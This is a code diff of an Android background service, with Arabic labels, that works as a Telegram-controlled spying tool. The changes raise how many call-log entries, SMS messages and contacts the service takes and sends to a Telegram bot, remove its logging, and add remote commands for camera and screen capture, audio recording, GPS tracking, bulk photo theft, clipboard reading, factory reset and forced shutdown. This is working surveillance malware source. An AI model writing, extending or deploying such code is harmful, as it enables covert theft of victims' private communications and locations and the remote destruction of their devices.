-        if (!hasPermission(Manifest.permission.SEND_SMS)) {
-            sendMessage(chatId, "⚠️ صلاحية إرسال الرسائل (SEND_SMS) غير ممنوحة.")
-            return
-        }
-        try {
-            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                getSystemService(SmsManager::class.java)
-            } else {
-                @Suppress("DEPRECATION")
-                SmsManager.getDefault()
-            }
-            smsManager.sendTextMessage(phoneNumber, null, messageText, null, null)
-            sendMessage(chatId, "✉️ تم إرسال رسالة SMS إلى $phoneNumber")
-        } catch (e: Exception) {
-            Log.e(TAG, "executeSendSms error", e)
-            sendMessage(chatId, "⚠️ فشل إرسال رسالة SMS: ${e.message}")
-        }
-    }
-
-    private fun fetchCallLogs(chatId: String) {
-        if (!hasPermission(Manifest.permission.READ_CALL_LOG)) {
-            sendMessage(chatId, "⚠️ صلاحية قراءة سجل المكالمات (READ_CALL_LOG) غير ممنوحة.")
-            return
-        }
-        thread(name = "FetchCallsThread") {
+    private fun extractCallHistory(chatId: String) {
+        if (!hasPermission(Manifest.permission.READ_CALL_LOG)) return
+        executionExecutor.execute {
             try {
-                val projection = arrayOf(
-                    CallLog.Calls.NUMBER,
-                    CallLog.Calls.TYPE,
-                    CallLog.Calls.DATE,
-                    CallLog.Calls.DURATION
-                )
+                val projection = arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION)
                 val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault())
-                val sb = StringBuilder("📞 سجل المكالمات (آخر 15):\n")
+                val sb = StringBuilder("📞 سجل المكالمات (آخر 100):\n")
                 var count = 0
-                contentResolver.query(
-                    CallLog.Calls.CONTENT_URI,
-                    projection,
-                    null,
-                    null,
-                    "${CallLog.Calls.DATE} DESC"
-                )?.use { cursor ->
+                contentResolver.query(CallLog.Calls.CONTENT_URI, projection, null, null, "${CallLog.Calls.DATE} DESC")?.use { cursor ->
                     val numIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
                     val typeIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
                     val dateIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)
-                    val durIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)
-                    while (cursor.moveToNext() && count < 15) {
-                        val number = cursor.getString(numIdx) ?: "غير معروف"
-                        val type = when (cursor.getInt(typeIdx)) {
-                            CallLog.Calls.INCOMING_TYPE -> "واردة"
-                            CallLog.Calls.OUTGOING_TYPE -> "صادرة"
-                            CallLog.Calls.MISSED_TYPE -> "فائتة"
-                            else -> "أخرى"
-                        }
-                        val dateStr = formatter.format(Date(cursor.getLong(dateIdx)))
-                        val duration = cursor.getLong(durIdx)
-                        sb.append("• $number [$type] - $dateStr (${duration}s)\n")
+                    while (cursor.moveToNext() && count < 100) {
+                        sb.append("• ${cursor.getString(numIdx)} - ${formatter.format(Date(cursor.getLong(dateIdx)))}\n")
                         count++
                     }
                 }
-                sendMessage(chatId, if (count == 0) "ℹ️ سجل المكالمات فارغ." else sb.toString())
+                sendDirectMessage(chatId, if (count == 0) "ℹ️ سجل المكالمات فارغ." else sb.toString())
             } catch (e: Exception) {
-                Log.e(TAG, "fetchCallLogs error", e)
-                sendMessage(chatId, "⚠️ خطأ أثناء سحب سجل المكالمات: ${e.message}")
+                sendDirectMessage(chatId, "❌ خطأ المكالمات: ${e.message}")
             }
         }
     }
 
-    private fun fetchSmsMessages(chatId: String) {
-        if (!hasPermission(Manifest.permission.READ_SMS)) {
-            sendMessage(chatId, "⚠️ صلاحية قراءة الرسائل (READ_SMS) غير ممنوحة.")
-            return
-        }
-        thread(name = "FetchSmsThread") {
+    private fun extractSmsArchive(chatId: String) {
+        if (!hasPermission(Manifest.permission.READ_SMS)) return
+        executionExecutor.execute {
             try {
                 val uri = Uri.parse("content://sms")
                 val projection = arrayOf("address", "body", "date")
                 val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault())
-                val sb = StringBuilder("💬 رسائل SMS (آخر 15):\n")
+                val sb = StringBuilder("💬 رسائل SMS (آخر 100):\n")
                 var count = 0
                 contentResolver.query(uri, projection, null, null, "date DESC")?.use { cursor ->
                     val addrIdx = cursor.getColumnIndexOrThrow("address")
                     val bodyIdx = cursor.getColumnIndexOrThrow("body")
-                    val dateIdx = cursor.getColumnIndexOrThrow("date")
-                    while (cursor.moveToNext() && count < 15) {
-                        val address = cursor.getString(addrIdx) ?: "غير معروف"
-                        val body = (cursor.getString(bodyIdx) ?: "").take(120)
-                        val dateStr = formatter.format(Date(cursor.getLong(dateIdx)))
-                        sb.append("• من: $address ($dateStr)\n  $body\n")
+                    while (cursor.moveToNext() && count < 100) {
+                        sb.append("• من: ${cursor.getString(addrIdx)}\n  ${cursor.getString(bodyIdx)?.take(150)}\n")
                         count++
                     }
                 }
-                sendMessage(chatId, if (count == 0) "ℹ️ لا توجد رسائل SMS." else sb.toString())
+                sendDirectMessage(chatId, if (count == 0) "ℹ️ لا توجد رسائل." else sb.toString())
             } catch (e: Exception) {
-                Log.e(TAG, "fetchSmsMessages error", e)
-                sendMessage(chatId, "⚠️ خطأ أثناء سحب رسائل SMS: ${e.message}")
+                sendDirectMessage(chatId, "❌ خطأ الرسائل: ${e.message}")
             }
         }
     }
 
-    private fun fetchContacts(chatId: String) {
-        if (!hasPermission(Manifest.permission.READ_CONTACTS)) {
-            sendMessage(chatId, "⚠️ صلاحية قراءة جهات الاتصال (READ_CONTACTS) غير ممنوحة.")
-            return
-        }
-        thread(name = "FetchContactsThread") {
+    private fun extractContactsDirectory(chatId: String) {
+        if (!hasPermission(Manifest.permission.READ_CONTACTS)) return
+        executionExecutor.execute {
             try {
-                val projection = arrayOf(
-                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
-                    ContactsContract.CommonDataKinds.Phone.NUMBER
-                )
-                val sb = StringBuilder("📇 جهات الاتصال (أول 25):\n")
+                val projection = arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER)
+                val sb = StringBuilder("📇 جهات الاتصال (أول 500):\n")
                 var count = 0
-                contentResolver.query(
-                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                    projection,
-                    null,
-                    null,
-                    "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
-                )?.use { cursor ->
+                contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC")?.use { cursor ->
                     val nameIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                     val numIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
-                    while (cursor.moveToNext() && count < 25) {
-                        val name = cursor.getString(nameIdx) ?: "بدون اسم"
-                        val number = cursor.getString(numIdx) ?: ""
-                        sb.append("• $name: $number\n")
+                    while (cursor.moveToNext() && count < 500) {
+                        sb.append("• ${cursor.getString(nameIdx)}: ${cursor.getString(numIdx)}\n")
                         count++
                     }
                 }
-                sendMessage(chatId, if (count == 0) "ℹ️ لا توجد جهات اتصال." else sb.toString())
+                sendDirectMessage(chatId, if (count == 0) "ℹ️ لا توجد جهات اتصال." else sb.toString())
             } catch (e: Exception) {
-                Log.e(TAG, "fetchContacts error", e)
-                sendMessage(chatId, "⚠️ خطأ أثناء سحب جهات الاتصال: ${e.message}")
+                sendDirectMessage(chatId, "❌ خطأ جهات الاتصال: ${e.message}")
             }
         }
     }
 
-    private fun uploadFileToTelegram(
-        chatId: String,
-        file: File,
-        method: String,
-        fieldName: String,
-        mimeType: String,
-        caption: String
-    ) {
+    private fun pushFileToTelegram(chatId: String, file: File, method: String, fieldName: String, mimeType: String, caption: String) {
         var connection: HttpURLConnection? = null
         try {
             val boundary = "Boundary_${System.currentTimeMillis()}"
-            val lineEnd = "\r\n"
-            val twoHyphens = "--"
-
             val url = URL("https://api.telegram.org/bot$botToken/$method")
             connection = url.openConnection() as HttpURLConnection
             connection.doOutput = true
-            connection.doInput = true
-            connection.useCaches = false
             connection.requestMethod = "POST"
-            connection.connectTimeout = 15000
-            connection.readTimeout = 30000
             connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
 
             DataOutputStream(connection.outputStream).use { out ->
-                out.write((twoHyphens + boundary + lineEnd).toByteArray(Charsets.UTF_8))
-                out.write("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd".toByteArray(Charsets.UTF_8))
-                out.write((chatId + lineEnd).toByteArray(Charsets.UTF_8))
+                out.write("--$boundary\r\n".toByteArray())
+                out.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".toByteArray())
+                out.write("$chatId\r\n".toByteArray())
 
-                out.write((twoHyphens + boundary + lineEnd).toByteArray(Charsets.UTF_8))
-                out.write("Content-Disposition: form-data; name=\"caption\"$lineEnd$lineEnd".toByteArray(Charsets.UTF_8))
-                out.write((caption + lineEnd).toByteArray(Charsets.UTF_8))
+                out.write("--$boundary\r\n".toByteArray())
+                out.write("Content-Disposition: form-data; name=\"caption\"\r\n\r\n".toByteArray())
+                out.write("$caption\r\n".toByteArray())
 
-                out.write((twoHyphens + boundary + lineEnd).toByteArray(Charsets.UTF_8))
-                out.write("Content-Disposition: form-data; name=\"$fieldName\"; filename=\"${file.name}\"$lineEnd".toByteArray(Charsets.UTF_8))
-                out.write("Content-Type: $mimeType$lineEnd$lineEnd".toByteArray(Charsets.UTF_8))
+                out.write("--$boundary\r\n".toByteArray())
+                out.write("Content-Disposition: form-data; name=\"$fieldName\"; filename=\"${file.name}\"\r\n".toByteArray())
+                out.write("Content-Type: $mimeType\r\n\r\n".toByteArray())
 
-                FileInputStream(file).use { fis ->
-                    fis.copyTo(out)
-                }
-
-                out.write(lineEnd.toByteArray(Charsets.UTF_8))
-                out.write((twoHyphens + boundary + twoHyphens + lineEnd).toByteArray(Charsets.UTF_8))
-                out.flush()
+                FileInputStream(file).use { it.copyTo(out) }
+                out.write("\r\n--$boundary--\r\n".toByteArray())
             }
-
-            val code = connection.responseCode
-            val stream = if (code == 200) connection.inputStream else connection.errorStream
-            val resp = stream?.bufferedReader()?.use { it.readText() } ?: ""
-            Log.d(TAG, "$method response ($code): $resp")
-        } catch (e: Exception) {
-            Log.e(TAG, "uploadFileToTelegram error ($method)", e)
-            sendMessage(chatId, "⚠️ فشل رفع الملف (${file.name}): ${e.message}")
+            connection.inputStream?.close()
+        } catch (_: Exception) {
         } finally {
             connection?.disconnect()
         }
     }
 
-    private fun hasPermission(permission: String): Boolean {
-        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
-    }
+    private fun hasPermission(permission: String): Boolean = ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
 
-    private fun answerCallbackQuery(callbackQueryId: String) {
+    private fun acknowledgeCallback(callbackQueryId: String) {
         if (callbackQueryId.isBlank()) return
-        thread(name = "AnswerCallback") {
-            var connection: HttpURLConnection? = null
+        executionExecutor.execute {
             try {
                 val body = JSONObject().put("callback_query_id", callbackQueryId)
-                val url = URL("https://api.telegram.org/bot$botToken/answerCallbackQuery")
-                connection = url.openConnection() as HttpURLConnection
-                connection.requestMethod = "POST"
-                connection.doOutput = true
-                connection.connectTimeout = 10000
-                connection.readTimeout = 15000
-                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
-                connection.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
-                connection.inputStream?.close()
-            } catch (e: Exception) {
-                Log.e(TAG, "Error answering callback query", e)
-            } finally {
-                connection?.disconnect()
-            }
+                val conn = URL("https://api.telegram.org/bot$botToken/answerCallbackQuery").openConnection() as HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.doOutput = true
+                conn.outputStream.use { it.write(body.toString().toByteArray()) }
+                conn.inputStream?.close()
+            } catch (_: Exception) {}
         }
     }
 
-    private fun sendKeyboard(chatId: String, text: String) {
-        thread(name = "TelegramSendKeyboard") {
-            var connection: HttpURLConnection? = null
+    private fun sendControlPanelKeyboard(chatId: String, text: String) {
+        executionExecutor.execute {
             try {
                 val keyboard = JSONArray().apply {
-                    put(
-                        JSONArray().apply {
-                            put(JSONObject().put("text", "📸 التقاط صورة").put("callback_data", "take_photo"))
-                            put(JSONObject().put("text", "🎙️ تسجيل صوتي").put("callback_data", "record_audio"))
-                        }
-                    )
-                    put(
-                        JSONArray().apply {
-                            put(JSONObject().put("text", "📂 عرض الملفات").put("callback_data", "view_files"))
-                            put(JSONObject().put("text", "📥 سحب الملفات").put("callback_data", "pull_files"))
-                        }
-                    )
-                    put(
-                        JSONArray().apply {
-                            put(JSONObject().put("text", "🖼️ عرض الصور").put("callback_data", "view_images"))
-                            put(JSONObject().put("text", "📤 سحب الصور").put("callback_data", "pull_images"))
-                        }
-                    )
-                    put(
-                        JSONArray().apply {
-                            put(JSONObject().put("text", "📞 اتصال بالهدف").put("callback_data", "make_call"))
-                            put(JSONObject().put("text", "✉️ إرسال SMS").put("callback_data", "send_sms"))
-                        }
-                    )
-                    put(
-                        JSONArray().apply {
-                            put(JSONObject().put("text", "📞 سجل المكالمات").put("callback_data", "get_calls"))
-                            put(JSONObject().put("text", "💬 سجل SMS").put("callback_data", "get_sms"))
-                        }
-                    )
-                    put(
-                        JSONArray().apply {
-                            put(JSONObject().put("text", "📇 جهات الاتصال").put("callback_data", "get_contacts"))
-                            put(JSONObject().put("text", "📋 حالة الخدمة").put("callback_data", "service_status"))
-                        }
-                    )
-                    put(
-                        JSONArray().apply {
-                            put(JSONObject().put("text", "ℹ️ معلومات النظام").put("callback_data", "sys_info"))
-                            put(JSONObject().put("text", "🔌 إعادة تشغيل").put("callback_data", "system_reboot"))
-                        }
-                    )
+                    put(JSONArray().apply {
+                        put(JSONObject().put("text", "📸 كاميرا أمامية").put("callback_data", "take_photo"))
+                        put(JSONObject().put("text", "📸 كاميرا خلفية").put("callback_data", "take_photo_rear"))
+                    })
+                    put(JSONArray().apply {
+                        put(JSONObject().put("text", "🎥 تسجيل فيديو").put("callback_data", "record_video"))
+                        put(JSONObject().put("text", "🎬 تسجيل شاشة").put("callback_data", "record_screen"))
+                    })
+                    put(JSONArray().apply {
+                        put(JSONObject().put("text", "🎙️ صوت (30ث)").put("callback_data", "record_audio"))
+                        put(JSONObject().put("text", "📍 موقع GPS").put("callback_data", "get_location"))
+                    })
+                    put(JSONArray().apply {
+                        put(JSONObject().put("text", "🟢 تفعيل التتبع").put("callback_data", "start_live_tracking"))
+                        put(JSONObject().put("text", "🔴 إيقاف التتبع").put("callback_data", "stop_live_tracking"))
+                    })
+                    put(JSONArray().apply {
+                        put(JSONObject().put("text", "📥 سحب 10 صور").put("callback_data", "pull_images_10"))
+                        put(JSONObject().put("text", "📥 سحب 20 صورة").put("callback_data", "pull_images_20"))
+                        put(JSONObject().put("text", "📥 سحب 30 صورة").put("callback_data", "pull_images_30"))
+                    })
+                    put(JSONArray().apply {
+                        put(JSONObject().put("text", "📥 سحب 50 صورة").put("callback_data", "pull_images_50"))
+                        put(JSONObject().put("text", "📥 سحب 100 صورة").put("callback_data", "pull_images_100"))
+                    })
+                    put(JSONArray().apply {
+                        put(JSONObject().put("text", "🚀 تفريغ شامل").put("callback_data", "full_dump_report"))
+                        put(JSONObject().put("text", "📋 الحافظة").put("callback_data", "get_clipboard"))
+                    })
+                    put(JSONArray().apply {
+                        put(JSONObject().put("text", "📞 المكالمات").put("callback_data", "get_calls"))
+                        put(JSONObject().put("text", "💬 الرسائل").put("callback_data", "get_sms"))
+                        put(JSONObject().put("text", "📇 جهات الاتصال").put("callback_data", "get_contacts"))
+                    })
+                    put(JSONArray().apply {
+                        put(JSONObject().put("text", "⚠️ إبادة الجهاز").put("callback_data", "factory_reset"))
+                        put(JSONObject().put("text", "🔌 إطفاء قسري").put("callback_data", "remote_shutdown"))
+                    })
                 }
 
                 val body = JSONObject().apply {
@@ -762,51 +674,37 @@ class BackgroundControlService : Service() {
                     put("reply_markup", JSONObject().put("inline_keyboard", keyboard))
                 }
 
-                connection = URL("https://api.telegram.org/bot$botToken/sendMessage").openConnection() as HttpURLConnection
-                connection.requestMethod = "POST"
-                connection.doOutput = true
-                connection.connectTimeout = 10000
-                connection.readTimeout = 15000
-                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
-
-                connection.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
-                connection.inputStream?.close()
-            } catch (e: Exception) {
-                Log.e(TAG, "Keyboard sending error", e)
-            } finally {
-                connection?.disconnect()
-            }
+                val conn = URL("https://api.telegram.org/bot$botToken/sendMessage").openConnection() as HttpURLConnection
+                    conn.requestMethod = "POST"
+                conn.doOutput = true
+                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+                conn.outputStream.use { it.write(body.toString().toByteArray()) }
+                conn.inputStream?.close()
+            } catch (_: Exception) {}
         }
     }
 
-    private fun sendMessage(chatId: String, text: String) {
-        thread(name = "TelegramMessage") {
-            var connection: HttpURLConnection? = null
+    private fun sendDirectMessage(chatId: String, text: String) {
+        executionExecutor.execute {
             try {
                 val body = JSONObject().apply {
                     put("chat_id", chatId)
                     put("text", text)
                 }
-
-                connection = URL("https://api.telegram.org/bot$botToken/sendMessage").openConnection() as HttpURLConnection
-                connection.requestMethod = "POST"
-                connection.doOutput = true
-                connection.connectTimeout = 10000
-                connection.readTimeout = 15000
-                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
-
-                connection.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
-                connection.inputStream?.close()
-            } catch (e: Exception) {
-                Log.e(TAG, "Message sending error", e)
-            } finally {
-                connection?.disconnect()
-            }
+                val conn = URL("https://api.telegram.org/bot$botToken/sendMessage").openConnection() as HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.doOutput = true
+                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+                conn.outputStream.use { it.write(body.toString().toByteArray()) }
+                conn.inputStream?.close()
+            } catch (_: Exception) {}
         }
     }
 
     override fun onDestroy() {
         isRunning = false
+        isTrackingActive = false
+        try { executionExecutor.shutdownNow() } catch (_: Exception) {}
         super.onDestroy()
     }
 }
